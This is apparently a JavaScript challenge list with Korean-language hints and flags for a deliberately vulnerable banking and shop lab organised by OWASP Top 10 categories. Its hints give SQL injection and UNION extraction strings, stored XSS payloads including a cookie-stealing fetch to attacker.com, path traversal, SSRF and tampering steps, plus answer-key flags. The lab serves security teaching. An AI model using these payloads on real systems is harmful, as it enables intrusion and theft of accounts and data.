const challenges = [
  {
    id: 'A01-1',
    category: 'A01 - Broken Access Control',
    title: '다른 유저 계좌 조회 (IDOR)',
    description: '자신의 계좌 정보가 아닌 다른 유저의 계좌 정보를 조회해보세요.',
    target: '/dashboard/account/:id',
    difficulty: 'easy',
    hints: [
      'URL의 :id 파라미터를 변경해보세요.',
      '/dashboard/account/1 에 접근해보면 어떨까요?',
      '서버에서 현재 로그인한 사용자와 요청한 ID를 비교하는 코드가 없습니다.'
    ],
    flag: 'AXIO{IDOR_account_access_1337}'
  },
  {
    id: 'A01-2',
    category: 'A01 - Broken Access Control',
    title: '관리자 페이지 접근',
    description: '일반 유저로 관리자 페이지에 접근해보세요.',
    target: '/admin',
    difficulty: 'easy',
    hints: [
      '관리자 권한 체크 미들웨어를 살펴보세요.',
      'URL에 쿼리 파라미터를 추가해보세요.',
      '/admin?role=admin 으로 접근해보세요.'
    ],
    flag: 'AXIO{broken_access_control_admin_bypass}'
  },
  {
    id: 'A02-1',
    category: 'A02 - Cryptographic Failures',
    title: '비밀번호 저장 방식 확인',
    description: '데이터베이스에서 비밀번호가 어떻게 저장되어 있는지 확인하세요.',
    target: '/admin/query',
    difficulty: 'medium',
    hints: [
      '관리자 페이지의 SQL 실행 기능을 이용하세요.',
      'SELECT * FROM users 쿼리를 실행해보세요.',
      '일부 비밀번호는 평문, 일부는 MD5 해시로 저장되어 있습니다.'
    ],
    flag: 'AXIO{weak_crypto_md5_plaintext}'
  },
  {
    id: 'A03-1',
    category: 'A03 - Injection (SQL)',
    title: 'SQL Injection으로 로그인 우회',
    description: '비밀번호 없이 admin 계정으로 로그인해보세요.',
    target: '/login',
    difficulty: 'easy',
    hints: [
      '로그인 쿼리가 문자열 연결로 구성됩니다.',
      "username 필드에 SQL 주석을 활용해보세요.",
      "username: admin'-- 또는 admin'/*"
    ],
    flag: 'AXIO{sqli_login_bypass_success}'
  },
  {
    id: 'A03-2',
    category: 'A03 - Injection (XSS)',
    title: 'Stored XSS',
    description: '공지사항 댓글에 XSS 페이로드를 삽입해보세요.',
    target: '/notice',
    difficulty: 'easy',
    hints: [
      '댓글 내용이 HTML 이스케이프 없이 렌더링됩니다.',
      '<script>alert(1)</script> 를 댓글로 작성해보세요.',
      'img 태그의 onerror 속성도 활용 가능합니다.'
    ],
    flag: 'AXIO{stored_xss_in_comments}'
  },
  {
    id: 'A04-1',
    category: 'A04 - Insecure Design',
    title: '음수 송금으로 잔액 증가',
    description: '송금 금액을 음수로 입력하여 자신의 잔액을 늘려보세요.',
    target: '/dashboard/transfer',
    difficulty: 'medium',
    hints: [
      '송금 금액에 서버 측 검증이 없습니다.',
      'amount 파라미터에 음수 값을 전송해보세요.',
      'Burp Suite로 요청을 가로채 amount=-1000000 으로 변조해보세요.'
    ],
    flag: 'AXIO{insecure_design_negative_transfer}'
  },
  {
    id: 'A05-1',
    category: 'A05 - Security Misconfiguration',
    title: 'Path Traversal',
    description: '파일 다운로드 기능을 이용해 서버의 설정 파일을 읽어보세요.',
    target: '/admin/download',
    difficulty: 'medium',
    hints: [
      'file 파라미터에 디렉토리 트래버설 문자열을 사용해보세요.',
      '?file=../../app.js 로 접근해보세요.',
      'package.json에서 사용 중인 라이브러리 버전을 확인할 수 있습니다.'
    ],
    flag: 'AXIO{path_traversal_config_leak}'
  },
  {
    id: 'A07-1',
    category: 'A07 - Auth Failures',
    title: 'JWT 약한 시크릿 크래킹',
    description: 'API 토큰의 JWT 시크릿을 크래킹하고 admin 권한 토큰을 생성해보세요.',
    target: '/api/token',
    difficulty: 'hard',
    hints: [
      '/api/token으로 토큰을 발급받아보세요.',
      'jwt.io 또는 hashcat으로 시크릿을 크래킹해보세요.',
      '시크릿은 매우 간단한 단어입니다.',
      '크래킹 후 role: admin 으로 토큰을 재서명하세요.'
    ],
    flag: 'AXIO{jwt_weak_secret_cracked}'
  },
  {
    id: 'A08-1',
    category: 'A08 - Data Integrity Failures',
    title: '파일 업로드 취약점',
    description: '파일 업로드 기능을 통해 웹셸을 업로드해보세요.',
    target: '/api/upload',
    difficulty: 'hard',
    hints: [
      '파일 업로드 시 확장자 검증이 없습니다.',
      'JWT 토큰이 필요합니다. /api/token에서 발급받으세요.',
      '.js 또는 .ejs 파일을 업로드해보세요.'
    ],
    flag: 'AXIO{file_upload_webshell}'
  },
  {
    id: 'A09-1',
    category: 'A09 - Logging Failures',
    title: '출금 로그 미존재 확인',
    description: 'API를 통해 출금 후 로그가 기록되지 않음을 확인하세요.',
    target: '/api/withdraw',
    difficulty: 'medium',
    hints: [
      '/api/withdraw 엔드포인트로 출금을 요청하세요.',
      '출금 후 거래 내역 DB에 로그가 없음을 확인하세요.',
      'transactions 테이블을 조회해보세요.'
    ],
    flag: 'AXIO{no_audit_log_for_withdrawal}'
  },
  {
    id: 'A10-1',
    category: 'A10 - SSRF',
    title: 'SSRF로 내부 서비스 접근',
    description: '시세 정보 가져오기 기능으로 내부 서버에 접근해보세요.',
    target: '/admin/price-fetch',
    difficulty: 'hard',
    hints: [
      '외부 URL 요청 시 URL 검증이 없습니다.',
      'http://localhost:3000 또는 http://127.0.0.1:3000 을 입력해보세요.',
      '내부 관리 API에도 접근해볼 수 있습니다.'
    ],
    flag: 'AXIO{ssrf_internal_access}'
  },
  {
    id: 'A06-1',
    category: 'A06 - Vulnerable & Outdated Components',
    title: '취약한 라이브러리 버전 탐지',
    description: '서버에서 사용 중인 라이브러리 목록을 확인하고 취약한 버전을 찾아보세요.',
    target: '/system/components',
    difficulty: 'easy',
    hints: [
      '/system/components 페이지에서 사용 중인 패키지 목록을 확인하세요.',
      'jsonwebtoken 8.x 버전은 알려진 취약점이 있습니다.',
      'axios 1.6.x 이전 버전에서 SSRF 관련 취약점이 보고된 바 있습니다.',
      '각 패키지의 CVE를 검색해보세요.'
    ],
    flag: 'AXIO{A06_outdated_jwt_cve_2022_23529}'
  },
  {
    id: 'A04-2',
    category: 'A04 - Insecure Design',
    title: 'Mass Assignment으로 관리자 권한 획득',
    description: '마이페이지 프로필 수정 시 role 파라미터를 조작해 관리자로 권한 상승하세요.',
    target: '/mypage',
    difficulty: 'medium',
    hints: [
      '프로필 수정 폼을 Burp Suite로 가로채보세요.',
      'role=user 파라미터가 있습니다.',
      'role=admin 으로 변경 후 전송해보세요.',
      '변경 후 /admin 페이지에 접근해보세요.'
    ],
    flag: 'AXIO{mass_assignment_role_escalation}'
  },
  {
    id: 'A02-2',
    category: 'A02 - Cryptographic Failures',
    title: '현재 비밀번호 확인 없는 비밀번호 변경',
    description: '마이페이지에서 현재 비밀번호 없이 계정 비밀번호를 변경해보세요.',
    target: '/mypage',
    difficulty: 'easy',
    hints: [
      '비밀번호 변경 폼에 현재 비밀번호 필드가 없습니다.',
      '세션 쿠키만 있으면 비밀번호 변경이 가능합니다.',
      'XSS로 탈취한 세션으로도 비밀번호 변경이 가능합니다.'
    ],
    flag: 'AXIO{no_current_password_verification}'
  },
  {
    id: 'A07-2',
    category: 'A07 - Identification & Authentication Failures',
    title: '로그인 브루트포스 공격',
    description: '계정 잠금 없이 비밀번호를 무한 시도해 계정을 탈취해보세요.',
    target: '/login',
    difficulty: 'medium',
    hints: [
      '로그인 실패 횟수 제한이 없습니다.',
      'Burp Suite Intruder로 비밀번호 목록을 대입해보세요.',
      'alice의 비밀번호는 흔한 단어입니다. (rockyou.txt 상위권)',
      '/system/login-log 에서 시도 횟수를 확인할 수 있습니다.'
    ],
    flag: 'AXIO{A07_bruteforce_no_lockout}'
  },
  {
    id: 'SHOP-A01',
    category: 'A01 - Broken Access Control (쇼핑몰)',
    title: '타인의 주문 상세 열람 (IDOR)',
    description: '자신의 주문이 아닌 다른 사용자의 주문 상세 페이지를 조회해보세요.',
    target: '/shop/orders/:id',
    difficulty: 'easy',
    hints: [
      '주문 완료 후 URL에서 주문 ID를 확인하세요.',
      '/shop/orders/1 로 직접 접근해보세요.',
      '서버에서 주문 소유자를 검증하는 코드가 없습니다.'
    ],
    flag: 'AXIO{shop_idor_order_disclosure}'
  },
  {
    id: 'SHOP-A03-XSS',
    category: 'A03 - Injection (쇼핑몰 XSS)',
    title: '상품 리뷰 Stored XSS',
    description: '상품 리뷰에 XSS 페이로드를 삽입하여 다른 사용자의 쿠키를 탈취해보세요.',
    target: '/shop/product/:id',
    difficulty: 'easy',
    hints: [
      '리뷰 내용이 HTML 이스케이프 없이 출력됩니다.',
      '<script>alert(document.cookie)</script> 를 리뷰로 작성해보세요.',
      '<img src=x onerror="fetch(\'http://attacker.com/?c=\'+document.cookie)"> 도 가능합니다.'
    ],
    flag: 'AXIO{shop_xss_review_injection}'
  },
  {
    id: 'SHOP-A03-SQLi',
    category: 'A03 - Injection (쇼핑몰 SQLi)',
    title: '상품 검색 SQL Injection',
    description: '상품 검색 기능의 SQL Injection 취약점으로 users 테이블의 데이터를 추출하세요.',
    target: '/shop?q=',
    difficulty: 'medium',
    hints: [
      '검색어가 SQL 쿼리에 직접 삽입됩니다.',
      "검색창에 ' OR '1'='1 을 입력해보세요.",
      "UNION SELECT를 활용해 다른 테이블 데이터를 추출해보세요.",
      "' UNION SELECT id,username,password,email,role,price,stock,category,image_url FROM users-- 시도"
    ],
    flag: 'AXIO{shop_sqli_search_union}'
  },
  {
    id: 'SHOP-A04',
    category: 'A04 - Insecure Design (쇼핑몰)',
    title: '장바구니 가격 파라미터 조작',
    description: '장바구니 추가 시 unit_price를 1원으로 변조하여 상품을 거의 무료로 구매하세요.',
    target: '/shop/product/:id',
    difficulty: 'easy',
    hints: [
      '상품 상세 페이지의 "장바구니 담기" 폼을 확인하세요.',
      'unit_price가 hidden input으로 전송됩니다.',
      'Burp Suite로 요청을 가로채 unit_price=1 로 변조 후 전송하세요.',
      '장바구니에서 단가가 조작된 것을 확인할 수 있습니다.'
    ],
    flag: 'AXIO{shop_price_manipulation}'
  }
];

module.exports = challenges;
